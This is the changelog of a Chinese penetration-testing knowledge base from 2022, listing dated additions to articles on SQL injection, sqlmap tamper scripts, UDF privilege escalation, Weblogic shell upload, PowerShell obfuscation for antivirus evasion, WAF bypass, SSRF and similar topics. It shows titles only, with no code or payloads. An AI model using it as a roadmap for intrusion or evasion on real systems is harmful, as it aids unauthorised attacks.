01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/02.网络空间搜索引擎 更新修改 01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/01.小程序 更新修改 01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/03.APP 更新修改 01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集/04.PC应用 新增 01.渗透测试/01.信息收集/1.资产收集/04.其他应用收集 更新修改 01.渗透测试/02.WEB漏洞/01.SQL注入/01.注入点检测 更新修改 01.渗透测试/02.WEB漏洞/01.SQL注入/02.数据库识别 更新修改 01.渗透测试/02.WEB漏洞/01.SQL注入/03.MySQL/01.常用符号:函数:语句归类 更新修改 01.渗透测试/02.WEB漏洞/01.SQL注入/03.MySQL/02.各种注入手法 更新修改 01.渗透测试/02.WEB漏洞/01.SQL注入/03.MySQL/03.绕过技巧 更新修改 01.渗透测试/02.WEB漏洞/01.SQL注入/03.MySQL/04.innodb存储引擎 新增 01.渗透测试/02.WEB漏洞/01.SQL注入/03.MySQL/05.UDF提权 新增 01.渗透测试/02.WEB漏洞/01.SQL注入/04.MSSQL/01.常用符号:函数:语句归类 更新修改 01.渗透测试/02.WEB漏洞/01.SQL注入/05.Oracle/01.常用符号:函数:语句归类 更新修改 01.渗透测试/02.WEB漏洞/01.SQL注入/05.Oracle/02.各种注入手法 更新修改 01.渗透测试/02.WEB漏洞/01.SQL注入/06.PostgreSQL/01.常用符号:函数:语句归类 更新修改 01.渗透测试/02.WEB漏洞/01.SQL注入/07.Access 新增 01.渗透测试/02.WEB漏洞/01.SQL注入/08.万能密码 新增 01.渗透测试/02.WEB漏洞/01.SQL注入/09.工具Sqlmap 新增 01.渗透测试/02.WEB漏洞/01.SQL注入/09.工具Sqlmap/tamper 新增 01.渗透测试/02.WEB漏洞/01.SQL注入 更新修改 2022年01月29日 路径 操作 01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/02.IP段查询 新增 01.渗透测试/03.思路技巧/04.Weblogic上传shell路径 新增 2022年02月 2022年02月07日 路径 操作 01.渗透测试/02.WEB漏洞/13.GraphQL测试 新增 03.编程开发/GO/02.GO实例/01.GO常用基础实例 补充更新 06.免杀/powershell/01.Powershell扫盲 新增 06.免杀/powershell/02.powershell混淆 新增 2022年02月08日 路径 操作 04.暂未分类/03.蜜罐/01.apache简易蜜罐 新增 2022年02月10日 路径 操作 02.代码审计/01.Java安全/04.RCE回显链/01.Tomcat回显链（一） 新增 2022年02月11日 路径 操作 01.渗透测试/02.WEB漏洞/14.列目录漏洞 新增 01.渗透测试/02.WEB漏洞/15.任意文件下载:读取 新增 2022年02月16日 路径 操作 01.渗透测试/02.WEB漏洞/16.文件上传 新增 01.渗透测试/03.思路技巧/05.网页接口加密暴破 新增 2022年02月23日 路径 操作 01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/08.工具自动化 补充更新 01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/10.存活性探测 补充更新 01.渗透测试/02.WEB漏洞/03.CSRF/01.CSRF 补充更新 01.渗透测试/02.WEB漏洞/03.CSRF/04.SameSite 新增 01.渗透测试/02.WEB漏洞/12.SSRF/01.DNS重绑定 新增 01.渗透测试/02.WEB漏洞/12.SSRF/SSRF 补充更新 01.渗透测试/02.WEB漏洞/16.文件上传 新增 01.渗透测试/03.思路技巧/05.网页接口加密暴破 新增 2022年02月24日 路径 操作 01.渗透测试/02.WEB漏洞/16.文件上传 补充更新 01.渗透测试/02.WEB漏洞/16.文件上传/文件上传攻击 新增 2022年03月 2022年03月01日 路径 操作 01.渗透测试/02.WEB漏洞/17.子域名接管 新增 01.渗透测试/02.WEB漏洞/18.条件竞争 新增 04.暂未分类/01.代理类/02.SSH加密隧道-科学上网临时手段 新增 2022年03月04日 路径 操作 01.渗透测试/02.WEB漏洞/19.文件包含漏洞 新增 2022年03月08日 路径 操作 01.渗透测试/07.WAF绕过/WAF绕过通用思路 新增 2022年03月09日 路径 操作 01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/07.Hackerone 新增 01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/08.Google 新增 04.暂未分类/04.docker/docker compose模板文件 新增 2022年03月20日 路径 操作 04.暂未分类/04.docker/docker compose模板文件 补充更新 2022年03月22日 路径 操作 01.渗透测试/02.WEB漏洞/04.XXE BUG修复 01.渗透测试/02.WEB漏洞/20.LDAP注入/LDAP注入 新增 01.渗透测试/02.WEB漏洞/21.JSONP数据劫持 新增 04.暂未分类/05.nginx/nginx反向代理配置 新增 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-03-22 19:12:42 "},"友情链接.html":{"url":"友情链接.html","title":"友情链接","keywords":"","body":"以下排名不分先后 略略略 d3sh1n 昏鸦 laker Al1ex AresX Ca1s1 xjqz Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-03-20 20:04:20 "}}